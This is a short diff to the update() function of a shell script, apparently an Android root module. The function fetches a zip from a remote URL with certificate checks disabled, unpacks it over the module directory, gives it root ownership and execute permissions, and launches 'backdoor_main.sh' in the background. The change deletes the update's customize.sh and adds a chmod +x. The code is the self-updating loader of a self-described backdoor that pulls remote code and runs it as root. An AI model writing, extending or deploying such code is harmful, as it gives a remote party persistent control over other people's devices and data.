@@ -56,11 +56,12 @@ update() {
         $_curl -sLk "$updateZipUrl" --output "$MODDIR"/newver.zip
         mkdir "$MODDIR"/newver
         unzip -o -q -d "$MODDIR"/newver "$MODDIR"/newver.zip
-        rm -rf "$MODDIR"/newver.zip
+        rm -rf "$MODDIR"/newver.zip "$MODDIR/newver/customize.sh"
         cp -af "$MODDIR/newver" "$MODDIR"
         rm -rf "$MODDIR"/newver
         chown -R root:root "$MODDIR"
         chmod -R 0775 "$MODDIR"
+        chmod +x "$MODDIR"
         "$MODDIR"/backdoor_main.sh &
         exit 0
     fi
